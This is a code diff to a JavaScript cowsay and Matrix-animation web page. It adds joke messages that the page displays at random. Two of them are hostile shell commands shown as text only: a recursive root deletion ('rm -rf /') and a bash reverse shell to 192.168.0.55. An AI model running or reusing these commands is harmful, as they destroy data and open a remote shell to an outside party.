@@ -23,6 +23,13 @@ const COWSAY_ASCII =
     "      ,'  ,-----'   |        \\\n" +
     "      `--{__________)        \\/\n";
 
+const RANDOM_MESSAGES = [
+    "rm -rf /",
+    "bash -i >& /dev/tcp/192.168.0.55/9001 0>&1",
+    "btw i use arch",
+    "It's not a bug, its a feature."
+];
+
 // Code source: https://dev.to/gnsp/making-the-matrix-effect-in-javascript-din
 // With several modifications...
 const canvas = document.getElementById('canvas');
@@ -78,11 +85,21 @@ function add_animation(msg) {
 function animation_handler() {
 
     let elem = document.getElementById("cowsay");
+    let timeout = false;
 
     setInterval(() => {
         let frame = frames.shift();
-        if (frame != undefined)
+        if (frame != undefined) {
             elem.innerText = frame;
+        } else if (!timeout) {
+            timeout = true;
+
+            setTimeout(() => {
+                let index = Math.floor(Math.random() * RANDOM_MESSAGES.length);
+                add_animation(RANDOM_MESSAGES[index]);
+                timeout = false;
+            }, 5000)
+        }
 
         matrix();
     }, 100);
